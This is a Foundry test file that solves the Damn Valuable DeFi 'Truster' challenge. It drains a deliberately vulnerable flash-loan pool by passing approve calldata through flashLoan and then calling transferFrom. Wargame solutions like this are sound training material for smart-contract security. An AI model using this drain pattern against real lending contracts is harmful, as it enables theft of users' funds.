// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/2/TrusterLenderPool.sol";
import "../src/DamnValuableToken.sol";
contract TrusterLenderPoolTest is Test {
    using Address for address;
    uint TOKENS_IN_POOL = 1000000 ether;
    uint INITIAL_ATTACKER_TOKEN_BALANCE = 100 ether;
    TrusterLenderPool pool;
    DamnValuableToken token;
    address attacker;
    address someUser;
    function setUp() external {
        attacker = vm.addr(1);
        vm.deal(attacker, 1000 ether);
        // setup contracts
        token = new DamnValuableToken();
        pool = new TrusterLenderPool(address(token));
        token.transfer(address(pool), 1000000);
        
    }
    
    function testComplete() external {
        vm.startPrank(attacker);
        uint256 poolBalance =  token.balanceOf(address(pool));
        emit log_named_uint("pool balance", poolBalance);
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", attacker, poolBalance);
        pool.flashLoan(0, attacker, address(token), data);
        token.transferFrom(address(pool), attacker, poolBalance);
        assert(token.balanceOf(address(pool)) == 0);
    }
}